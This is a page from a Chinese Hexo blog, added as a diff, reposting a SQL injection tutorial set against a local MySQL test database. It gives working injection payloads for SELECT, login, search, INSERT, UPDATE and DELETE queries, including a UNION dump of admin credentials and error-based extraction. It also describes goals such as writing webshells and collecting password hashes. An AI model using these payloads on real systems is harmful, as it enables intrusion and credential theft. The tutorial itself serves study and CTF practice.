@@ -1,0 +1,694 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang>
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="此篇文章转载自：https://klionsec.github.io/2014/11/09/sqli-readme/刷题时遇到一个绕过的题：https://github.com/bowu678/php_bugs#16-sql注入or绕过 看题以后很蒙圈，最后Google一下找到这篇总结性的文章，就把这个大佬的文章借过来了。 首先,创建测试库,表,准备好测试数据:创建数据库：1234C:\&amp;gt;m">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SQL注入理解">
+<meta property="og:url" content="http://yoursite.com/2019/03/01/SQL注入理解/index.html">
+<meta property="og:site_name" content="MagicZ">
+<meta property="og:description" content="此篇文章转载自：https://klionsec.github.io/2014/11/09/sqli-readme/刷题时遇到一个绕过的题：https://github.com/bowu678/php_bugs#16-sql注入or绕过 看题以后很蒙圈，最后Google一下找到这篇总结性的文章，就把这个大佬的文章借过来了。 首先,创建测试库,表,准备好测试数据:创建数据库：1234C:\&amp;gt;m">
+<meta property="og:locale" content="default">
+<meta property="og:updated_time" content="2019-03-01T12:12:57.003Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="SQL注入理解">
+<meta name="twitter:description" content="此篇文章转载自：https://klionsec.github.io/2014/11/09/sqli-readme/刷题时遇到一个绕过的题：https://github.com/bowu678/php_bugs#16-sql注入or绕过 看题以后很蒙圈，最后Google一下找到这篇总结性的文章，就把这个大佬的文章借过来了。 首先,创建测试库,表,准备好测试数据:创建数据库：1234C:\&amp;gt;m">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/03/01/SQL注入理解/">
+
+
+
+
+
+  <title>SQL注入理解 | MagicZ</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">MagicZ</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            About
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/03/01/SQL注入理解/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="MagicZ">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="MagicZ">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">SQL注入理解</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-03-01T19:51:49+08:00">
+                2019-03-01
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h3 id="此篇文章转载自：https-klionsec-github-io-2014-11-09-sqli-readme"><a href="#此篇文章转载自：https-klionsec-github-io-2014-11-09-sqli-readme" class="headerlink" title="此篇文章转载自：https://klionsec.github.io/2014/11/09/sqli-readme/"></a>此篇文章转载自：<a href="https://klionsec.github.io/2014/11/09/sqli-readme/" target="_blank" rel="noopener">https://klionsec.github.io/2014/11/09/sqli-readme/</a></h3><p>刷题时遇到一个绕过的题：<a href="https://github.com/bowu678/php_bugs#16-sql注入or绕过" target="_blank" rel="noopener">https://github.com/bowu678/php_bugs#16-sql注入or绕过</a> 看题以后很蒙圈，最后Google一下找到这篇总结性的文章，就把这个大佬的文章借过来了。</p>
+<h3 id="首先-创建测试库-表-准备好测试数据"><a href="#首先-创建测试库-表-准备好测试数据" class="headerlink" title="首先,创建测试库,表,准备好测试数据:"></a>首先,创建测试库,表,准备好测试数据:</h3><p>创建数据库：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt;mysql -uroot -p</span><br><span class="line">mysql&gt; create database sqli;</span><br><span class="line">mysql&gt; show databases;</span><br><span class="line">mysql&gt; use sqli;</span><br></pre></td></tr></table></figure></p>
+<a id="more"></a>
+<p>建表 personal_info(人员信息表),admin(假设为网站管理表,里面存的是网站后台管理员的账号密码):</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; create table if not exists `personal_info`(</span><br><span class="line">   -&gt; `id` int unsigned not null auto_increment,</span><br><span class="line">   -&gt; `name` varchar(50) not null,</span><br><span class="line">   -&gt; `age` int not null,</span><br><span class="line">   -&gt; `phonenu` varchar(20) not null unique,</span><br><span class="line">   -&gt; `email` varchar(20) not null unique,</span><br><span class="line">   -&gt; `sex` varchar(20) not null default &apos;man&apos;,</span><br><span class="line">   -&gt; `birthday` date not null default &apos;1991-01-01&apos;,</span><br><span class="line">   -&gt; primary key(`id`),</span><br><span class="line">   -&gt; index username_index(`name`),</span><br><span class="line">   -&gt; index userpass_index(`phonenu`)</span><br><span class="line">   -&gt; )ENGINE=MyISAM DEFAULT CHARSET=utf8 collate utf8_general_ci;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; create table if not exists `admin`(</span><br><span class="line">    -&gt; `id` int unsigned not null auto_increment,</span><br><span class="line">    -&gt; `username` varchar(50) not null,</span><br><span class="line">    -&gt; `passwd` varchar(50) not null,</span><br><span class="line">    -&gt; `email` varchar(20) not null unique,</span><br><span class="line">    -&gt; primary key(`id`),</span><br><span class="line">    -&gt; index username_index(`username`),</span><br><span class="line">    -&gt; index userpass_index(`passwd`)</span><br><span class="line">    -&gt; )ENGINE=MyISAM DEFAULT CHARSET=utf8 collate utf8_general_ci;</span><br></pre></td></tr></table></figure>
+<h3 id="理解-sql注入产生的根因"><a href="#理解-sql注入产生的根因" class="headerlink" title="理解 sql注入产生的根因:"></a>理解 sql注入产生的根因:</h3><p>脚本在接收前台传过来的数据时,没有对该数据进行很好的安全检查就直接丢到数据库中去操作,导致入侵者在前台随正常数据一起提交过来的恶意sql语句也被一并带入数据库中执行[各种子查询,联合查询…],也就是说,注入的本质,只是数据库本身,与后端脚本,系统平台无关</p>
+<h3 id="我们利用-sql注入到底可以干些什么"><a href="#我们利用-sql注入到底可以干些什么" class="headerlink" title="我们利用 sql注入到底可以干些什么"></a>我们利用 sql注入到底可以干些什么</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">在当前数据库用户权限够的时候,一般为数据库管理员</span><br><span class="line">执行系统命令,但这并不直接就等于’提权’,具体权限的大小还要取决于你服务用户的系统权限</span><br><span class="line">写文件,比如,我们可能会尝试往目标网站目录中写webshell,但能不能写进去,还要看目录具体权限</span><br><span class="line">读文件,尝试读取带有账号密码的各类敏感配置文件,然后再想办法配合其它的漏洞一起利用</span><br><span class="line">在当前数据库用户权限一般的时候,比如,只能在指定的库中进行正常的增删改查</span><br><span class="line">像这种情况,一般我们可能会尝试查出目标网站管理员的账号和密码hash,然后再登到后台传webshell</span><br><span class="line">或者搜集各种能搜集到[有权限]的各类用户密码数据,时刻为后面的字典作准备,以备不时之需</span><br></pre></td></tr></table></figure>
+<h3 id="先理解一些最简单的sql注入漏洞语句原型及闭合方法"><a href="#先理解一些最简单的sql注入漏洞语句原型及闭合方法" class="headerlink" title="先理解一些最简单的sql注入漏洞语句原型及闭合方法:"></a>先理解一些最简单的sql注入漏洞语句原型及闭合方法:</h3><p>最常见的 select 查询注入:</p>
+<p>关于select 的注入,也可能会是我们在实战中遇到的最多的一种注入语句,实际上在前端涉及增删改的操作一般都非常少,除非像那种论坛程序,对于大多数普通的cms而言,前端用户的大多数操作可能都是在点击链接,然后把对应的参数值传给后端脚本,然后脚本再到数据库中去查,之后再把查询的结果返回给前端页面显示给用户</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">标准数字型注入语句:</span><br><span class="line">mysql&gt; select * from personal_info where id=3;</span><br><span class="line"></span><br><span class="line">数字型sql注入利用,数字嘛,也不存在什么闭合,直接跟上sql,就可以一下就把网站管理员的账号密码都查出来:</span><br><span class="line">mysql&gt; select * from personal_info where id=-3 union select username,passwd,3,4,5,6,7 from admin;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">标准字符型注入语句:</span><br><span class="line">mysql&gt; select * from personal_info where name=&apos;fedora&apos;;</span><br><span class="line"></span><br><span class="line">字符型sql注入利用,想办法闭合单引号,and后面可随意跟上各种子查询就可以把所有数据遍历出来了</span><br><span class="line">mysql&gt; select * from personal_info where name=&apos;fedora&apos; and 12=12 -- -; &apos;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">各种常见的登陆框注入漏洞原型sql语句:</span><br><span class="line">mysql&gt; select * from admin where username=&apos;admin&apos; and passwd=&apos;abc123&apos;;</span><br><span class="line"></span><br><span class="line">具体利用方法如下,依然是闭合前面注释后面,在and后面跟上各种子查询,直到把所有想要的数据都遍历出来:</span><br><span class="line">mysql&gt; select * from admin where username=&apos;admin&apos; and 12=12 -- - passwd=&apos;abc123&apos;;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">针对各类搜索框注入的漏洞原型sql语句:</span><br><span class="line">mysql&gt; select * from personal_info where name like &apos;%ka%&apos;;</span><br><span class="line"></span><br><span class="line">具体利用方法 也非常简单,只需要前后的单引号和通配符都闭合掉即可保证语句的正常执行</span><br><span class="line">mysql&gt; select * from personal_info where name like &apos;%%&apos; and 12=12 -- +%&apos;;</span><br></pre></td></tr></table></figure>
+<p>insert 注入利用核心:</p>
+<p>因为一些功能需求,在前端可能会有很多需要录入各种用户信息的表单,丢给后端脚本以后,脚本会把传过来的这些数据再插到数据库,例如典型的基于各种形式的个人中心功能,一旦遇到了,都可以随便尝试insert注入,注意,想成功利用insert注入有个必要的前提,就是你一定要知道自己插入的数据在前端的什么地方显示,如果别人只是单单搜集用户信息,然后插到数据库中,并没有在前端页面上显示,即使你知道它存在insert注入也是个鸡肋</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">漏洞语句原型:</span><br><span class="line">mysql&gt; insert into personal_info(*) values(&apos;injection&apos;,123,&apos;123456789011&apos;,&apos;sqli@inection.org&apos;,&apos;man&apos;,&apos;0000-00-00&apos;);</span><br><span class="line"></span><br><span class="line">利用如下,注意这里的闭合方法,insert前后字段的个数和数据类型务必一致,不然是闭合不了的,具体该怎么确定字段个数呢,其实很简单,你就一位位的字段递增,直到它返回正常为止,然后再在爆出来的字段上查数据就可以了</span><br><span class="line">mysql&gt; insert into personal_info(name,age,phonenu,email,sex,birthday) values(&apos;injection&apos;,1,2,3,4,5)-- -123,&apos;123456789011&apos;,&apos;sqli@inection.org&apos;,&apos;man&apos;,&apos;0000-00-00&apos;);</span><br></pre></td></tr></table></figure>
+<p>update 注入利用核心:</p>
+<p>关于update利用的点有两个,一个是在set的时候,如果set的是一个从前端传过来的变量,结果可想而知,另一个则是where后面的条件,因为这个条件也是可以从前端传过来的,这个后果想必就应该清楚了,相对于insert可能会比较麻烦的一点的是,update一般都是在set一个新值,这也就意味着我们在闭合的时候,在前端很可能是没有任何回显的,这样的话我们在实际查询数据的时候可能就要费点儿劲了,具体利用过程如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">漏洞原型语句:</span><br><span class="line">mysql&gt; update personal_info set email = &apos;flow@yeah.net&apos; where name=&apos;fedora&apos;;</span><br><span class="line"></span><br><span class="line">漏洞利用语句,其实,这里是利用mysql自身的报错特性来查数据的,但大多数情况下,稍微有点儿尝试的目标站一般都会接收页面错误,这时你依然可以利用盲注的来查数据,方法大同小异</span><br><span class="line">mysql&gt; update personal_info set email=&apos;&apos;*(select 1 from(select count(*),concat((select (select (select concat(0x7e,database(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)* &apos;&apos; where name=&apos;fedora&apos;;</span><br></pre></td></tr></table></figure>
+<p>关于对delete注入的利用:</p>
+<p>对于delete语句,我们唯一能控制的地方可能就只有where后面的条件了,清晰明白这一点之后,剩下的事情就很好办了,说实话,在现在的web程序里,在前台涉及到delete的操作非常少,可以说几乎是没有,不过有时还是可以在后台尝试下,尤其在权限特别高的时候,至于怎么利用它来查数据,跟update差不太多,基本也是靠报错或者盲注来搞,具体利用过程如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">漏洞原型sql语句:</span><br><span class="line">mysql&gt; delete from personal_info where id=&apos;fedora&apos;;</span><br><span class="line"></span><br><span class="line">针对性注入利用,这个闭合其实跟select的时候差不多,无非就是数字或者字符串,数字就不存在什么闭合了,如果是字符串,注意闭合掉前后的单引号即可</span><br><span class="line">mysql&gt; delete from personal_info where id=&apos;fedora&apos; or (select 1 from (select count(*),Concat((select database()),0x3a,floor(rand(0)*2))y from information_schema.tables group by y)x) -- +&apos;;</span><br></pre></td></tr></table></figure>
+<h3 id="在对sql注入有了基本的了解之后-再来详细看看到底哪些地方容易出现sql注入-实战知道从哪儿入手"><a href="#在对sql注入有了基本的了解之后-再来详细看看到底哪些地方容易出现sql注入-实战知道从哪儿入手" class="headerlink" title="在对sql注入有了基本的了解之后,再来详细看看到底哪些地方容易出现sql注入,实战知道从哪儿入手"></a>在对sql注入有了基本的了解之后,再来详细看看到底哪些地方容易出现sql注入,实战知道从哪儿入手</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">get请求的url,正常情况下这里应该是最先会尝试的地方</span><br><span class="line">post数据字段中,数据较多时一般都会用post传,会是个不错的入手点</span><br><span class="line">cookie中传的数据,有些还可能会把一些参数放在cookie中传,所以这儿也会是个不错的入手点</span><br><span class="line">Referer本身用来记录上一个页面的url,但一旦被存到数据库中之后又被带入查询,你懂的 </span><br><span class="line">User-agent 本身用来记录客户端信息,只要被记录到数据库之后又被带入查询一样可被利用</span><br><span class="line">X-Forwarded-For 本身专门用来记录客户端真实ip,如果脚本在处理时把它也带到数据库中去查询...</span><br><span class="line">宽字节[双字节],	主要是由于前后端编码不统一造成理解歧义</span><br><span class="line">只要是你发现会和后端数据库交互的地方全都可以随便尝试,并不仅限于我上面提到的这些...</span><br></pre></td></tr></table></figure>
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/02/28/CTF漏洞函数总结/" rel="next" title="CTF漏洞函数总结">
+                <i class="fa fa-chevron-left"></i> CTF漏洞函数总结
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/03/01/SQL入坑/" rel="prev" title="SQL入坑">
+                SQL入坑 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">MagicZ</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">5</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#此篇文章转载自：https-klionsec-github-io-2014-11-09-sqli-readme"><span class="nav-number">1.</span> <span class="nav-text">此篇文章转载自：https://klionsec.github.io/2014/11/09/sqli-readme/</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#首先-创建测试库-表-准备好测试数据"><span class="nav-number">2.</span> <span class="nav-text">首先,创建测试库,表,准备好测试数据:</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#理解-sql注入产生的根因"><span class="nav-number">3.</span> <span class="nav-text">理解 sql注入产生的根因:</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#我们利用-sql注入到底可以干些什么"><span class="nav-number">4.</span> <span class="nav-text">我们利用 sql注入到底可以干些什么</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#先理解一些最简单的sql注入漏洞语句原型及闭合方法"><span class="nav-number">5.</span> <span class="nav-text">先理解一些最简单的sql注入漏洞语句原型及闭合方法:</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#在对sql注入有了基本的了解之后-再来详细看看到底哪些地方容易出现sql注入-实战知道从哪儿入手"><span class="nav-number">6.</span> <span class="nav-text">在对sql注入有了基本的了解之后,再来详细看看到底哪些地方容易出现sql注入,实战知道从哪儿入手</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">MagicZ</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
